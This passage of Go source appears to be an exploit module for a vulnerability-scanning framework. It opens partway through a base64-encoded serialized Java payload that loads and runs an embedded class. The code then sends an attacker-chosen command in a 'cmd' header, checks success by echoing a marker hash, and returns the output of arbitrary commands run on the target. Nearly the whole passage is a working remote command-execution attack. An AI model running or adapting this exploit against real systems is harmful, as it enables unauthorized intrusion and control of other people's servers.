jJBRDg2QlJrRnRnQkFtUUFMR1FXMkFFR25BQVVTSmpvR3V3QTdXUzIyQUVLM0FEMFNQcllBUHpvRnV3QXdXYmNBTVJrR3RnQXlHUVcyQUVDWkFBc1pCYllBUWFjQUJSSW10Z0F5dGdBME9nWVpCam9ITGNZQUJ5MjJBRU1aQjdBNkJSa0Z0Z0JFT2dZdHhnQUhMYllBUXhrR3NEb0lMY1lBQnkyMkFFTVpDTDhTUmJBQUJBQ2dBUXNCRmdBa0FLQUJDd0VxQUFBQkZnRWZBU29BQUFFcUFTd0JLZ0FBQUFJQVR3QUFBSG9BSGdBQUFDMEFEUUF1QUJZQUx3QWJBREFBSFFBeEFDQUFNZ0FwQURNQU93QTBBRThBTmdCbUFEZ0FlQUE1QUl3QU93Q2dBRDRBcVFBL0FMc0FRQURQQUVFQTRRQkNBUWNBUXdFTEFFY0JEd0JJQVJNQVF3RVdBRVFCR0FCRkFSOEFSd0VqQUVnQkp3QkZBU29BUndFd0FFZ0JOQUJLQVRjQVRBQlFBQUFBeGdBTy9nQlBCd0JUQndCWUJ3QlpGaVVUL0FBcUJ3QmFRUWNBVS84QUx3QUhCd0JSQndCVEJ3QlRCd0JZQndCWkJ3QmFCd0JUQUFFSEFGdi9BQUVBQndjQVVRY0FVd2NBVXdjQVdBY0FXUWNBV2djQVV3QUNCd0JiQndCVC9BQVRCd0JUL3dBQ0FBVUhBRkVIQUZNSEFGTUhBRmdIQUZrQUFRY0FWZjBBRUFjQVZRY0FVLzhBQWdBRkJ3QlJCd0JUQndCVEJ3QllCd0JaQUFFSEFGei9BQWtBQ1FjQVVRY0FVd2NBVXdjQVdBY0FXUUFBQUFjQVhBQUEvd0FDQUFJSEFGRUhBRk1BQUFBSkFGMEFYZ0FCQUU0QUFBQjZBQU1BQlFBQUFDTUJUaXJHQUI0cUt5eTJBRVpPTFFTMkFFY0JTNmYvN2pvRUtyWUFTRXVuLytRdHNBQUJBQVlBRkFBWEFDUUFBZ0JQQUFBQUtnQUtBQUFBVVFBQ0FGSUFCZ0JVQUEwQVZRQVNBRllBRkFCWkFCY0FWd0FaQUZnQUhnQlpBQ0VBV3dCUUFBQUFEUUFEL0FBQ0J3QmZWQWNBVlFrQUNRQmdBR0VBQVFCT0FBQUFqd0FEQUFZQUFBQTFLcllBR3pvRUtzRUFCNWtBQ1NyQUFBYzZCQmtFS3l5NEFFazZCUmtGeGdBTEdRVXFMYllBU3JDbkFBbzZCQmtFdGdBbEFiQUFBUUFBQUNnQUxBQWtBQUlBVHdBQUFDb0FDZ0FBQUdBQUJnQmhBQTBBWWdBVEFHUUFIQUJsQUNFQVpnQXBBR29BTEFCb0FDNEFhUUF6QUdzQVVBQUFBQkFBQlB3QUV3Y0FZdm9BRlVJSEFGVUdBQUVBWXdBQUFBSUFaQT09IjsKY2x6ID0gZGVmaW5lQ2xhc3MoYmFzZTY0RGVjb2RlVG9CeXRlKGNvZGUpKTsKY2x6Lm5ld0luc3RhbmNlKCk7dAAEZXZhbHVxAH4AGwAAAAFxAH4AI3NyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4")
		if err != nil {
			return nil, err
		}
		cfg.Header.Store("cmd", cmd)
		cfg.Data = string(data)
		return httpclient.DoHttpRequest(hostinfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadFlagGlhltf(u, "echo a5a64251c9a7dc28c5dde30a82e01572")
			if err != nil {
				return false
			} else {
				return strings.Contains(rsp.Utf8Html, "a5a64251c9a7dc28c5dde30a82e01572")
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				rsp, err := sendPayloadFlagGlhltf(expResult.HostInfo, goutils.B2S(ss.Params["cmd"]))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
